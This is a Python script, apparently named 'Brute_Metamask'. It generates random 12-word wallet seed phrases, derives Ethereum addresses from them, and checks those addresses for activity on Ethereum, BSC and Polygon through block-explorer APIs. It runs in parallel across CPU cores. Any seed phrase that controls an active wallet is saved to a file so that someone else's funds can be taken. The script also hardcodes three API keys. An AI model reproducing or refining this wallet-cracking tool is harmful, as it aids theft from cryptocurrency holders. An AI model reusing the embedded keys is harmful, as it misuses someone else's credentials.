import os
from multiprocessing import Process, cpu_count
from mnemonic import Mnemonic
from eth_account import Account
from chain_scanner import eth_scan, bsc_scan, poly_scan

Account_numbers_per_wallet = 1  # 1 Recommended

api_eth = "SWMZ4TV5NHYE3RFJPRR5WVQP3CRQJUZJ28"
api_bsc = "86VH6WEYVHN3KEM1BPK13X66GNS21NSSPR"
api_poly = "SST9HF8UAC2A3WJYQD5ZVEHHU7R6C4PUKG"

emptyTxt_path = r"C:\Users\Username\Brute_Metamask\empty.txt"   # Your empty.txt PATH
validTxt_path = r"C:\Users\Username\Brute_Metamask\valid.txt"   # Your valid.txt PATH

def bruteforce():
    if os.path.exists(emptyTxt_path) and os.path.exists(validTxt_path):
        while True:
            mnemon = Mnemonic('english')
            words = mnemon.generate(128)    # 12 words
            test = mnemon.check(words)
            if test == True:
                Account.enable_unaudited_hdwallet_features()
                for i in range(0,Account_numbers_per_wallet):
                    path = f"m/44'/60'/0'/0/{i}"
                    account = Account.from_mnemonic(words, account_path=path)
                    address = account.address
                    print(f"Testing: {address}...")
                    txs_eth = eth_scan(api_eth, address)
                    txs_bsc = bsc_scan(api_bsc, address)
                    txs_poly = poly_scan(api_poly, address)
                    if (txs_eth != True and txs_bsc != True and txs_poly != True):
                        with open(emptyTxt_path, "a") as file:
                            file.write(f"Menonic: {words}  Address: {address}\n")
                    else:
                        print("FOUND !!!")
                        with open(validTxt_path, "a") as file:
                            file.write(f"Menonic: {words}  Address: {address}\n")
    else:
        print("The PATH of the empty.txt or valid.txt file is incorrect. The file does not exist at this location.")

# Multi-core Booster
if __name__ == '__main__':
    num_processes = cpu_count()
    processes = []
    
    input_processes = int(input(f"({num_processes} available cores) Select how many cores you want to use (MAX 5 recommended using standard API KEY): "))

    for i in range(input_processes):
        process = Process(target=bruteforce)
        processes.append(process)
    
    for process in processes:
        process.start()
    
    for process in processes:
        process.join()
